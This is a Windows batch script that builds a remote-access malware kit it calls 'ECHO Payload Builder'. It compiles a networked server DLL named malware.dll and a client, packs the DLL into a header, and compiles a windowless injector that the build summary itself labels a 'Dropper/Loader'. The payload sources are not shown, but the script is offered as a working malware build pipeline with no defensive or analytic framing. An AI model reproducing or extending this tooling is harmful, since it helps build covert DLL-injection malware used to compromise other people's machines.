@echo off
cls
title ECHO Builder - Compilation Tool
color 0A

echo.
echo  ==========================================
echo         ECHO - Payload Builder v1.0      
echo  ==========================================
echo.

set DLL_NAME=malware.dll
set CLIENT_NAME=client.exe
set INJECTOR_NAME=injector.exe
set PACKED_HEADER=packed.h

echo [1/4] Compiling Server DLL...
echo.

g++ -shared -o %DLL_NAME% server.cpp -lws2_32 -static-libgcc -static-libstdc++ -O2 -s


if %errorlevel% equ 0 (
    echo   [ok] %DLL_NAME% compiled successfully!
    echo   [->] Size: 
    dir %DLL_NAME% | find "%DLL_NAME%"
) else (
    echo   [error] Failed to compile %DLL_NAME%
    goto :error
)

echo.

echo [2/4] Compiling Client...
echo.

g++ -o %CLIENT_NAME% client.cpp -lws2_32

if %errorlevel% equ 0 (
    echo   [ok] %CLIENT_NAME% compiled successfully!
    echo   [->] Size: 
    dir %CLIENT_NAME% | find "%CLIENT_NAME%"
) else (
    echo   [error] Failed to compile %CLIENT_NAME%
    goto :error
)

echo.

echo [3/4] Packing DLL to Header...
echo.

if exist %PACKED_HEADER% (
    del %PACKED_HEADER%
)

python pack.py %DLL_NAME% %PACKED_HEADER%

if %errorlevel% equ 0 (
    echo   [ok] %DLL_NAME% packed to %PACKED_HEADER%!
    echo   [->] Size: 
    dir %PACKED_HEADER% | find "%PACKED_HEADER%"
) else (
    echo   [error] Failed to pack DLL
    goto :error
)

echo.

echo [4/4] Compiling Injector...
echo.

g++ -o %INJECTOR_NAME% loader.cpp -lws2_32 -static-libgcc -static-libstdc++ -O2 -s -mwindows

if %errorlevel% equ 0 (
    echo   [ok] %INJECTOR_NAME% compiled successfully!
    echo   [->] Size: 
    dir %INJECTOR_NAME% | find "%INJECTOR_NAME%"
) else (
    echo   [error] Failed to compile %INJECTOR_NAME%
    goto :error
)

echo.

echo ================================================
echo                  BUILD SUMMARY
echo ================================================
echo.
echo   [ok] %DLL_NAME%         - Server Backend
echo   [ok] %CLIENT_NAME%      - Client Interface  
echo   [ok] %PACKED_HEADER%    - Packed Payload
echo   [ok] %INJECTOR_NAME%    - Dropper/Loader
echo.
